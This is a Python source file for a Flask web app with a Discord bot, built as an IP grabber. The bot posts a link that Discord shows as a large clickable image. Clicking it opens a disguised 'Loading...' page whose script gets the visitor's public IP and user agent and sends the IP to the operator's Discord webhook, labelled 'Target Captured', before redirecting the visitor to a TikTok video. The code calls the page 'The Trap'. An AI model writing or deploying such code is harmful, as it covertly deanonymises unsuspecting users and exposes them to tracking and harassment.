# language: Python, file: app.py
import os
import socket
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string, send_file

_orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
RAILWAY_URL = "https://rnbw-production.up.railway.app"

# 1. The page Discord crawls to build the image preview
@app.route('/preview')
def preview():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:type" content="website">
        <meta property="og:title" content="Click to view">
        <!-- This makes Discord show the giant image -->
        <meta property="og:image" content="https://rnbw-production.up.railway.app/image.png">
        <meta property="og:image:width" content="400">
        <meta property="og:image:height" content="400">
    </head>
    <body></body>
    </html>
    """

# 2. The image itself
@app.route('/image.png')
def serve_image():
    try:
        return send_file("image.png", mimetype='image/png')
    except:
        return "Image not found", 404

# 3. The Trap (when they click the image, they hit this)
@app.route('/')
def index():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <script>
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => {
                    fetch('/log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
                    }).then(() => {
                        window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
                    });
                });
        </script>
    </head>
    <body style="background:#000;"></body>
    </html>
    """)

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ip = data.get('ip', 'Unknown')
    ua = data.get('ua', 'Unknown')
    
    payload = {
        "embeds": [{
            "title": "Target Captured",
            "color": 65280,
            "fields": [
                {"name": "Public IP", "value": f"```{ip}```", "inline": False}
            ]
        }]
    }
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)
    return "ok", 200

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}', flush=True)

@bot.command()
async def send(ctx):
    # We send a link to the preview.
    # Discord will crawl it, see the og:image, and build a massive clickable image.
    # When they click that image, it routes to the root URL ('/'), which is the trap.
    await ctx.send(f"<{RAILWAY_URL}/preview>")

def run_bot():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN missing.", flush=True)
        return
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}", flush=True)

threading.Thread(target=run_bot, daemon=True).start()
